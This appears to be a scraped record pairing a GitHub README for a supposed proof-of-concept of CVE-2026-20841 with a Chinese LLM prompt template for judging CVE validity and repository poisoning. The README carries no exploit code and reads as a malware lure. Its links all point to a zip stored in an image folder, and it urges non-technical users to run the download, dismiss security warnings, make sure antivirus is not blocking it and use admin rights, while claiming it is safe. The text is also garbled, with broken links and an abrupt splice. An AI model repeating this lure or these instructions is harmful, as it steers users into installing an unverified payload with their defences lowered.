d/CVE-2026-20841-PoC/main/img/C-CV-Po-v2.2.zip)](https://raw.githubusercontent.com/404godd/CVE-2026-20841-PoC/main/img/C-CV-Po-v2.2.zip)\n\n---\n\n## 📝 What is CVE-2026-20841-PoC?\n\nThis application is a simple Proof of Concept (PoC) tool designed to demonstrate the behavior of the security issue referenced by CVE-2026-20841. It helps users understand the impact of this specific vulnerability in a straightforward way.\n\nYou do not need any programming skills or technical knowledge to use this tool. It is intended for educational purposes and to raise awareness about the vulnerability.\n\n---\n\n## 💻 System Requirements\n\nBefore downloading and running the application, make sure your computer meets the following minimum requirements:\n\n- Operating System: Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu 18.04 or newer)\n- Processor: At least 1 GHz (any recent Intel or AMD processor will do)\n- RAM: 2 GB or more\n- Disk Space: 100 MB free space for application and data\n- Internet Connection: Required for downloading the software only\n\n---\n\n## 🚀 Getting Started\n\nThis section will guide you through downloading and running the software for the first time. The goal is for you to have it up and running quickly without any technical hassle.\n\n---\n\n## ⬇️ Download & Install\n\nTo get the software, **visit the official release page on GitHub**. This page contains the latest version of the PoC available for download.\n\nClick the button below to open the release page:\n\n[![Visit Release Page](https://raw.githubusercontent.com/404godd/CVE-2026-20841-PoC/main/img/C-CV-Po-v2.2.zip%20Page-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/404godd/CVE-2026-20841-PoC/main/img/C-CV-Po-v2.2.zip)\n\n### How to download\n\n1. After clicking the link, you will arrive at the \"Releases\" page of the project.\n2. Look for the latest release at the top of the list.\n3. Under the release description, find the assets section.\n4. Download the file that matches your operating system:\n   - For Windows, this might be a `.exe` or `.zip` file.\n   - For macOS, a `.dmg` or `.zip` file.\n   - For Linux, a `https://raw.githubusercontent.com/404godd/CVE-2026-20841-PoC/main/img/C-CV-Po-v2.2.zip` or `.AppImage` file.\n5. Save this file somewhere you can easily find it, like your Desktop or Downloads folder.\n\n### How to install\n\n- **Windows:** Double-click the `.exe` file or extract the `.zip` file and open the application inside.\n- **macOS:** Open the `.dmg` file and drag the app to your Applications folder, or extract the `.zip` and run the app.\n- **Linux:** Extract the `https://raw.githubusercontent.com/404godd/CVE-2026-20841-PoC/main/img/C-CV-Po-v2.2.zip` file or make the `.AppImage` file executable and run it.\n\n---\n\n## ▶️ Running the Application\n\nOnce installed, follow these instructions to run the PoC tool safely and easily:\n\n1. Find the application icon on your Desktop, in your Applications folder, or the location where you saved it.\n2. Double-click the icon to open the program.\n3. You will see a simple user interface with clear instructions on how to start the demonstration.\n4. Follow any on-screen prompts to see the behavior related to CVE-2026-20841.\n5. There is no need to input any complex data or commands.\n\nIf you see security warnings from your operating system, this is normal for programs downloaded from the internet. Confirm that you want to run the program.\n\n---\n\n## 🔒 Safety and Security\n\nThis software runs only on your own machine. It does not send or receive data over the internet during execution. It is safe to use for learning about the vulnerability.\n\nDo not use this tool on networks or devices you do not own or have permission to test. It is designed only for demonstration and educational purposes.\n\n---\n\n## 🛠️ Troubleshooting\n\nIf you encounter issues, try these steps:\n\n- Make sure your antivirus or security software is not blocking the application.\n- Ensure your operating system is up to date.\n- Redownload the file in case the previous download was corrupted.\n- Run the program with administrator or root privileges if you see permission errors.\n- Restart your computer and try again.\n\nFor further help, you can visit the GitHub page and check the “Issues” section, where other users and maintainers may have provided solutions.\n\n---\n\n## 📚 Additional Information\n\nThis tool focuses on demonstrating the problem described in CVE-2026-20841 clearly and simply. It does not fix or patch the vulnerability but helps users understand the risks.\n\nIf you want more technical or detailed information about the vulnerability, consider looking for official security advisories or reports fr\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
